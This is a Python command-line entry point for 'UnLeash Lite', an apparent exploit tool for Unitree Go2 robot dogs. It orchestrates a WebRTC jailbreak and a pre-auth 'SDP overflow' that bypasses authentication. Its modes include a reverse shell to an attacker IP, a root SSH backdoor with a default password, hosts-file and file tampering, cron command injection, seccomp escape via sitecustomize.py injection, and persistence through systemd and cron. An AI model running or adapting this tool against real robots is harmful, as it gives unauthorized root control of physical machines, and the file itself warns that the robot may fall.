"""Entry point: python -m unleash_lite"""

import argparse
import asyncio
import getpass
import logging
import socket
import sys


def _get_local_ip():
    for target in ("192.168.123.161", "8.8.8.8"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target, 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            continue
    return None


def main():
    # Detect subcommands before argparse sees them
    if len(sys.argv) > 1 and sys.argv[1] == "fetch-key":
        _main_fetch_key()
        return
    if len(sys.argv) > 1 and sys.argv[1] == "probe":
        _main_probe()
        return
    if len(sys.argv) > 1 and sys.argv[1] == "sdp-jailbreak":
        _main_sdp_jailbreak()
        return
    if len(sys.argv) > 1 and sys.argv[1] == "trigger":
        _main_trigger()
        return
    if len(sys.argv) > 1 and sys.argv[1] == "serve":
        _main_serve()
        return

    # Everything else is the jailbreak CLI
    parser = argparse.ArgumentParser(
        prog="unleash-lite",
        description="UnLeash Lite: WebRTC jailbreak for Unitree Go2",
        epilog="Subcommands:\n"
               "  unleash-lite fetch-key --email you@example.com\n"
               "  unleash-lite probe [--aes-key KEY] [--debug]\n"
               "  unleash-lite trigger [--hotkey L1+Y] [--robot-ip IP]\n"
               "  unleash-lite sdp-jailbreak <mode> [--interface-ip IP]  (benchtop only)\n"
               "  unleash-lite serve [--port 8443] [--password SECRET]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    _add_jailbreak_args(parser)
    args = parser.parse_args()
    _run_jailbreak(args)


def _main_fetch_key():
    parser = argparse.ArgumentParser(
        prog="unleash-lite fetch-key",
        description="Fetch per-device AES-128 key from Unitree cloud "
                    "(required for firmware >= 1.1.15)",
    )
    parser.add_argument("--email", required=True,
                        help="Unitree account email")
    parser.add_argument("--password",
                        help="Account password (prompted if omitted)")
    parser.add_argument("--sn",
                        help="Robot serial number (prints all devices if omitted)")
    parser.add_argument("--region", choices=["global", "cn"], default="global",
                        help="Cloud region (default: global)")
    parser.add_argument("--device-type", choices=["Go2", "G1"], default="Go2",
                        help="Device family (default: Go2)")
    args = parser.parse_args(sys.argv[2:])
    _run_fetch_key(args)


_JAILBREAK_MODES = [
    "ssh", "reverse-shell", "custom", "ssh-persist",
    "bypass-ssh", "bypass-hosts", "bypass-file", "bypass-cron",
    "bypass-escalate", "init-ssh", "init-ssh-persist",
]


def _add_jailbreak_args(parser):
    parser.add_argument("mode", choices=_JAILBREAK_MODES, help="Jailbreak mode")
    parser.add_argument("--robot-ip", default="192.168.123.161",
                        help="Robot IP address (default: 192.168.123.161)")
    parser.add_argument("--port", type=int, default=9991,
                        help="Signaling port (default: 9991)")
    parser.add_argument("--hotkey", default="L1+Y",
                        help="Controller hotkey binding (default: L1+Y)")
    parser.add_argument("--password", default="unleash",
                        help="Root password for ssh modes (default: unleash)")
    parser.add_argument("--cmd",
                        help="Shell command for 'custom' mode")
    parser.add_argument("--callback-ip",
                        help="This machine's IP for verification (auto-detected)")
    parser.add_argument("--callback-port", type=int, default=19999,
                        help="Callback listener port (default: 19999)")
    parser.add_argument("--no-callback", action="store_true",
                        help="Skip callback verification")
    parser.add_argument("--attacker-ip",
                        help="Attacker IP for reverse-shell / bypass-hosts")
    parser.add_argument("--file-path",
                        help="Target file path for bypass-file mode")
    parser.add_argument("--content",
                        help="File content for bypass-file mode")
    parser.add_argument("--code",
                        help="Unfiltered Python code for bypass-escalate mode")
    parser.add_argument("--aes-key",
                        help="Per-device AES-128 key (32 hex chars) for firmware >= 1.1.15")
    parser.add_argument("--trigger", choices=["auto", "manual"], default="auto",
                        help="Trigger mode: auto sends a fake controller press "
                             "via the bridge (experimental), manual waits for "
                             "you to press the hotkey on a physical controller "
                             "(default: auto)")
    parser.add_argument("--timeout", type=float, default=120,
                        help="Callback wait timeout (default: 120s)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging (dumps all DDS messages)")


def _run_fetch_key(args):
    try:
        from .unitree_cloud import fetch_aes_key, UnitreeCloud, UnitreeCloudError
    except ImportError:
        print("  Error: curl_cffi is required for fetch-key.")
        print("  Install it: pip install curl_cffi")
        sys.exit(1)

    password = args.password or getpass.getpass(f"  Password for {args.email}: ")

    print(f"  Logging in to Unitree cloud ({args.region})...")
    try:
        if args.sn:
            key = fetch_aes_key(
                email=args.email, password=password, sn=args.sn,
                region=args.region, device_type=args.device_type,
            )
            print(f"\n  SN:  {args.sn}")
            print(f"  Key: {key}")
            print(f"\n  Usage: python -m unleash_lite ssh --aes-key {key}")
        else:
            cloud = UnitreeCloud(
                region=args.region, device_type=args.device_type,
            )
            cloud.login(args.email, password)
            devices = cloud.list_devices()
            if not devices:
                print("  No devices bound to this account.")
                return
            print(f"\n  {'SN':<24}  {'Alias':<16}  {'Key'}")
            print(f"  {'-'*24}  {'-'*16}  {'-'*32}")
            for d in devices:
                sn = d.get("sn", "?")
                alias = d.get("alias", "") or "-"
                key = d.get("key", "") or d.get("gcm_key", "") or "(empty)"
                print(f"  {sn:<24}  {alias:<16}  {key}")
            print()
    except UnitreeCloudError as e:
        print(f"  Error: {e}")
        sys.exit(1)


def _main_probe():
    parser = argparse.ArgumentParser(
        prog="unleash-lite probe",
        description="Diagnostic probe: connect to robot, upload a no-op, "
                    "dump all raw DDS responses for firmware API analysis",
    )
    parser.add_argument("--robot-ip", default="192.168.123.161",
                        help="Robot IP address (default: 192.168.123.161)")
    parser.add_argument("--port", type=int, default=9991,
                        help="Signaling port (default: 9991)")
    parser.add_argument("--aes-key",
                        help="Per-device AES-128 key (32 hex chars) for firmware >= 1.1.15")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging (dumps all DDS messages)")
    args = parser.parse_args(sys.argv[2:])

    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")

    from .webrtc_jailbreak import probe
    asyncio.run(probe(args.robot_ip, args.port, aes_128_key=args.aes_key))


def _main_sdp_jailbreak():
    parser = argparse.ArgumentParser(
        prog="unleash-lite sdp-jailbreak",
        description="Jailbreak via SDP overflow — bypasses HTTP signaling, "
                    "AES auth, and xfkTon key entirely. Pure LAN, pre-auth.",
    )
    parser.add_argument("mode", choices=_JAILBREAK_MODES,
                        help="Jailbreak mode")
    parser.add_argument("--interface-ip",
                        help="Network interface IP for DDS multicast "
                             "(default: auto-detect or DDS_MC_INTERFACE env)")
    parser.add_argument("--hotkey", default="L1+Y",
                        help="Controller hotkey binding (default: L1+Y)")
    parser.add_argument("--password", default="unleash",
                        help="Root password for ssh modes (default: unleash)")
    parser.add_argument("--cmd",
                        help="Shell command for 'custom' / 'bypass-cron' mode")
    parser.add_argument("--callback-ip",
                        help="This machine's IP for verification (auto-detected)")
    parser.add_argument("--callback-port", type=int, default=19999,
                        help="Callback listener port (default: 19999)")
    parser.add_argument("--no-callback", action="store_true",
                        help="Skip callback verification")
    parser.add_argument("--attacker-ip",
                        help="Attacker IP for reverse-shell / bypass-hosts")
    parser.add_argument("--file-path",
                        help="Target file path for bypass-file mode")
    parser.add_argument("--content",
                        help="File content for bypass-file mode")
    parser.add_argument("--code",
                        help="Unfiltered Python code for bypass-escalate mode")
    parser.add_argument("--timeout", type=float, default=120,
                        help="Callback wait timeout (default: 120s)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")
    args = parser.parse_args(sys.argv[2:])
    _run_sdp_jailbreak(args)


def _main_trigger():
    parser = argparse.ArgumentParser(
        prog="unleash-lite trigger",
        description="Send a fake controller button press to trigger a "
                    "previously uploaded hotkey-bound payload. Default "
                    "mode uses the WebRTC bridge (works through DDS "
                    "Security). Use --via dds for direct DDS multicast "
                    "(benchtop boards only).",
    )
    parser.add_argument("--hotkey", default="L1+Y",
                        choices=["L1+Y", "L2+Y", "R1+Y"],
                        help="Hotkey combo to trigger (default: L1+Y)")
    parser.add_argument("--robot-ip", default="192.168.123.161",
                        help="Robot IP address (default: 192.168.123.161)")
    parser.add_argument("--port", type=int, default=9991,
                        help="Signaling port (default: 9991)")
    parser.add_argument("--aes-key",
                        help="Per-device AES-128 key (32 hex chars) for firmware >= 1.1.15")
    parser.add_argument("--via", choices=["bridge", "dds"], default="bridge",
                        help="Trigger method: bridge (default, works on production) "
                             "or dds (direct multicast, benchtop only)")
    parser.add_argument("--interface-ip",
                        help="Network interface IP for DDS multicast (--via dds only)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")
    args = parser.parse_args(sys.argv[2:])

    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")

    if args.via == "dds":
        from .webrtc_sdp import dds_trigger_hotkey, _detect_interface_ip

        interface_ip = args.interface_ip or _detect_interface_ip()
        if not interface_ip:
            print("  Error: cannot detect network interface. "
                  "Pass --interface-ip or set DDS_MC_INTERFACE.")
            sys.exit(1)

        print(f"  Sending {args.hotkey} via DDS multicast ({interface_ip})...")
        print(f"  (3s SEDP discovery wait)")
        try:
            dds_trigger_hotkey(interface_ip, args.hotkey)
            print(f"  Trigger sent.")
        except Exception as e:
            print(f"  Error: {e}")
            sys.exit(1)
    else:
        from .webrtc import Go2DataChannel

        async def _bridge_trigger():
            dc = Go2DataChannel(args.robot_ip, args.port,
                                aes_128_key=args.aes_key)
            try:
                print(f"  Connecting to {args.robot_ip}:{args.port}...")
                await dc.connect(timeout=15)
                print(f"  Sending {args.hotkey} via bridge...")
                await dc.trigger_hotkey(args.hotkey)
                print(f"  Trigger sent.")
            except Exception as e:
                print(f"  Error: {e}")
                sys.exit(1)
            finally:
                await dc.close()

        asyncio.run(_bridge_trigger())


def _run_sdp_jailbreak(args):
    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")

    from .webrtc_payloads import (
        payload_ssh, payload_reverse_shell, payload_custom,
        payload_ssh_persist, payload_bypass_ssh,
        payload_bypass_hosts, payload_bypass_file,
        payload_bypass_cron, payload_bypass_escalate,
        payload_sitecustomize_ssh, payload_init_ssh_persist,
    )
    from .webrtc_jailbreak import SDPJailbreakOrchestrator

    mode = args.mode
    hotkey = args.hotkey
    password = args.password
    callback_ip = args.callback_ip
    callback_port = args.callback_port
    no_callback = args.no_callback

    is_bypass = mode.startswith("bypass-") or mode.startswith("init-ssh")
    if is_bypass:
        no_callback = True

    if not callback_ip and not no_callback:
        callback_ip = _get_local_ip()

    if mode == "ssh":
        payload = payload_ssh(
            password=password, callback_ip=callback_ip,
            callback_port=callback_port, hotkey=hotkey)
    elif mode == "reverse-shell":
        attacker_ip = args.attacker_ip
        if not attacker_ip:
            print("  Error: --attacker-ip required for reverse-shell mode")
            sys.exit(1)
        payload = payload_reverse_shell(
            attacker_ip=attacker_ip, hotkey=hotkey)
    elif mode == "custom":
        if not args.cmd:
            print("  Error: --cmd required for custom mode")
            sys.exit(1)
        payload = payload_custom(
            command=args.cmd, callback_ip=callback_ip,
            callback_port=callback_port, hotkey=hotkey)
    elif mode == "ssh-persist":
        payload = payload_ssh_persist(
            password=password, callback_ip=callback_ip,
            callback_port=callback_port, hotkey=hotkey)
    elif mode == "bypass-ssh":
        payload = payload_bypass_ssh(password=password, hotkey=hotkey)
    elif mode == "bypass-hosts":
        attacker_ip = args.attacker_ip
        if not attacker_ip:
            attacker_ip = _get_local_ip()
        if not attacker_ip:
            print("  Error: --attacker-ip required (auto-detection failed)")
            sys.exit(1)
        payload = payload_bypass_hosts(attacker_ip=attacker_ip, hotkey=hotkey)
    elif mode == "bypass-file":
        if not args.file_path or not args.content:
            print("  Error: --file-path and --content required for bypass-file mode")
            sys.exit(1)
        payload = payload_bypass_file(
            file_path=args.file_path, content=args.content, hotkey=hotkey)
    elif mode == "bypass-cron":
        if not args.cmd:
            print("  Error: --cmd required for bypass-cron mode")
            sys.exit(1)
        payload = payload_bypass_cron(command=args.cmd, hotkey=hotkey)
    elif mode == "bypass-escalate":
        if not args.code:
            print("  Error: --code required for bypass-escalate mode")
            sys.exit(1)
        payload = payload_bypass_escalate(
            unfiltered_code=args.code, hotkey=hotkey)
    elif mode == "init-ssh":
        payload = payload_sitecustomize_ssh(password=password, hotkey=hotkey)
        print("  [init-ssh] Two-press sitecustomize.py injection + persistence:")
        print(f"    1st {hotkey}: writes sitecustomize.py (inside seccomp sandbox)")
        print(f"    2nd {hotkey}: Py_Initialize() loads it BEFORE seccomp,")
        print(f"           starts sshd + hooks deb_update.sh for persistence")
        print()
        print(f"  SSH will be available immediately after the 2nd press.")
        print(f"  SSH will survive reboots (persisted via deb_update.sh).")
        print(f"  Then: ssh root@<robot-ip>  (password: {password})")
        print()
        print("  CRITICAL: Remove sitecustomize.py after first SSH login or all")
        print("  Python services will crash on every boot (robot may fall):")
        print("    rm -f /usr/lib/python3.8/sitecustomize.py \\")
        print("          /usr/lib/python3.10/sitecustomize.py \\")
        print("          /usr/lib/python3.11/sitecustomize.py \\")
        print("          /usr/local/lib/python3.8/dist-packages/sitecustomize.py")
        print()
    elif mode == "init-ssh-persist":
        payload = payload_init_ssh_persist(password=password, hotkey=hotkey)
        print("  [init-ssh-persist] Two-press ssh_guard.sh installer (drop-in for")
        print("   init-ssh's deb_update.sh hook on builds where that hook fails):")
        print(f"    1st {hotkey}: writes ssh_guard.sh + self-removing sitecustomize.py")
        print(f"    2nd {hotkey}: Py_Initialize() loads sitecustomize.py BEFORE seccomp,")
        print(f"           runs `ssh_guard.sh install`, then self-removes")
        print()
        print(f"  Prereq: SSH must already be up (run `init-ssh` first).")
        print(f"  After the 2nd press, SSH is backed by:")
        print(f"    - systemd ssh-guard.service (re-enables sshd on boot)")
        print(f"    - 5-min cron entry (ssh_guard.sh check)")
        print(f"    - systemd path unit (watches ssh.service for changes)")
        print(f"  sitecustomize.py is removed by the install -- no cleanup needed.")
        print()
    else:
        print(f"  Unknown mode: {mode}")
        sys.exit(1)

    orchestrator = SDPJailbreakOrchestrator(
        payload=payload,
        interface_ip=args.interface_ip,
        callback_ip=callback_ip if not no_callback else None,
        callback_port=callback_port,
    )

    try:
        success = asyncio.run(
            orchestrator.execute(
                wait_for_callback=not no_callback,
                callback_timeout=args.timeout))
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        pass


def _run_jailbreak(args):
    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")

    from .webrtc_payloads import (
        payload_ssh, payload_reverse_shell, payload_custom,
        payload_ssh_persist, payload_bypass_ssh,
        payload_bypass_hosts, payload_bypass_file,
        payload_bypass_cron, payload_bypass_escalate,
        payload_sitecustomize_ssh, payload_init_ssh_persist,
    )
    from .webrtc_jailbreak import WebRTCJailbreakOrchestrator

    mode = args.mode
    hotkey = args.hotkey
    password = args.password
    callback_ip = args.callback_ip
    callback_port = args.callback_port
    no_callback = args.no_callback

    is_bypass = mode.startswith("bypass-") or mode.startswith("init-ssh")
    if is_bypass:
        no_callback = True

    if not callback_ip and not no_callback:
        callback_ip = _get_local_ip()

    if mode == "ssh":
        payload = payload_ssh(
            password=password, callback_ip=callback_ip,
            callback_port=callback_port, hotkey=hotkey)
    elif mode == "reverse-shell":
        attacker_ip = args.attacker_ip
        if not attacker_ip:
            print("  Error: --attacker-ip required for reverse-shell mode")
            sys.exit(1)
        payload = payload_reverse_shell(
            attacker_ip=attacker_ip, hotkey=hotkey)
    elif mode == "custom":
        if not args.cmd:
            print("  Error: --cmd required for custom mode")
            sys.exit(1)
        payload = payload_custom(
            command=args.cmd, callback_ip=callback_ip,
            callback_port=callback_port, hotkey=hotkey)
    elif mode == "ssh-persist":
        payload = payload_ssh_persist(
            password=password, callback_ip=callback_ip,
            callback_port=callback_port, hotkey=hotkey)
    elif mode == "bypass-ssh":
        payload = payload_bypass_ssh(password=password, hotkey=hotkey)
    elif mode == "bypass-hosts":
        attacker_ip = args.attacker_ip
        if not attacker_ip:
            attacker_ip = _get_local_ip()
        if not attacker_ip:
            print("  Error: --attacker-ip required (auto-detection failed)")
            sys.exit(1)
        payload = payload_bypass_hosts(attacker_ip=attacker_ip, hotkey=hotkey)
    elif mode == "bypass-file":
        if not args.file_path or not args.content:
            print("  Error: --file-path and --content required for bypass-file mode")
            sys.exit(1)
        payload = payload_bypass_file(
            file_path=args.file_path, content=args.content, hotkey=hotkey)
    elif mode == "bypass-cron":
        if not args.cmd:
            print("  Error: --cmd required for bypass-cron mode")
            sys.exit(1)
        payload = payload_bypass_cron(command=args.cmd, hotkey=hotkey)
    elif mode == "bypass-escalate":
        if not args.code:
            print("  Error: --code required for bypass-escalate mode")
            sys.exit(1)
        payload = payload_bypass_escalate(
            unfiltered_code=args.code, hotkey=hotkey)
    elif mode == "init-ssh":
        payload = payload_sitecustomize_ssh(password=password, hotkey=hotkey)
        print("  [init-ssh] Two-press sitecustomize.py injection:")
        print(f"    1st {hotkey}: writes sitecustomize.py (inside seccomp sandbox)")
        print(f"    2nd {hotkey}: Py_Initialize() loads it BEFORE seccomp, starts sshd")
        print()
        print(f"  SSH will be available immediately after the 2nd press.")
        print(f"  Then: ssh root@{args.robot_ip}  (password: {password})")
        print()
        print("  CRITICAL: Remove sitecustomize.py after first SSH login or all")
        print("  Python services will crash on every boot (robot may fall):")
        print("    rm -f /usr/lib/python3.8/sitecustomize.py \\")
        print("          /usr/lib/python3.10/sitecustomize.py \\")
        print("          /usr/lib/python3.11/sitecustomize.py \\")
        print("          /usr/local/lib/python3.8/dist-packages/sitecustomize.py")
        print()
    elif mode == "init-ssh-persist":
        payload = payload_init_ssh_persist(password=password, hotkey=hotkey)
        print("  [init-ssh-persist] Two-press ssh_guard.sh installer:")
        print(f"    1st {hotkey}: writes ssh_guard.sh + self-removing sitecustomize.py")
        print(f"    2nd {hotkey}: Py_Initialize() runs sitecustomize.py BEFORE seccomp,")
        print(f"           installs ssh_guard.sh, then self-removes")
        print()
        print(f"  Prereq: SSH must already be up (run `init-ssh` first).")
        print(f"  After the 2nd press, SSH is backed by ssh_guard.sh (systemd +")
        print(f"  cron + path unit) and sitecustomize.py is gone.")
        print()
    else:
        print(f"  Unknown mode: {mode}")
        sys.exit(1)

    auto_trigger = args.trigger == "auto"
    if mode.startswith("init-ssh"):
        auto_trigger = False

    orchestrator = WebRTCJailbreakOrchestrator(
        robot_ip=args.robot_ip,
        payload=payload,
        callback_ip=callback_ip if not no_callback else None,
        callback_port=callback_port,
        signaling_port=args.port,
        aes_128_key=args.aes_key,
    )

    try:
        success = asyncio.run(
            orchestrator.execute(
                wait_for_callback=not no_callback,
                callback_timeout=args.timeout,
                auto_trigger=auto_trigger))
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        pass


def _main_serve():
    parser = argparse.ArgumentParser(
        prog="unleash-lite serve",
        description="Launch the UnLeash Lite web dashboard",
    )
    parser.add_argument("--host", default="0.0.0.0",
                        help="Bind address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8443,
                        help="HTTP port (default: 8443)")
    parser.add_argument("--password",
                        help="Dashboard password (open access if omitted)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")
    args = parser.parse_args(sys.argv[2:])

    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")

    from .server import UnleashServer
    server = UnleashServer(host=args.host, port=args.port,
                           password=args.password)
    server.run()


if __name__ == "__main__":
    main()
